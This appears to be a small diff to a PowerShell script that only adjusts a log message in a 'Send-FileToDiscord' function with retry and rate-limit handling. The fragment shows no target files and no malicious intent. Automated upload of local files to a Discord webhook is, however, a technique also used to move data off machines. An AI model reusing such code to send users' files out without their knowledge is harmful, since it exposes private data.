@@ -48,7 +48,7 @@ function Send-FileToDiscord {
             Start-Sleep -Seconds $UploadDelaySeconds  # Add delay to reduce rate limit chances
             return
         } catch {
-            Write-Host "Attempt $attempt: Failed to send $FilePath to Discord: $_" -ForegroundColor Yellow
+            Write-Host "Attempt $attempt: Failed to send `${FilePath}` to Discord: $_" -ForegroundColor Yellow
             if ($_.Exception.Response.StatusCode -eq 429) {
                 # Wait longer and retry if rate-limited
                 Write-Host "Rate limit hit. Waiting 10 seconds before retrying..." -ForegroundColor Cyan
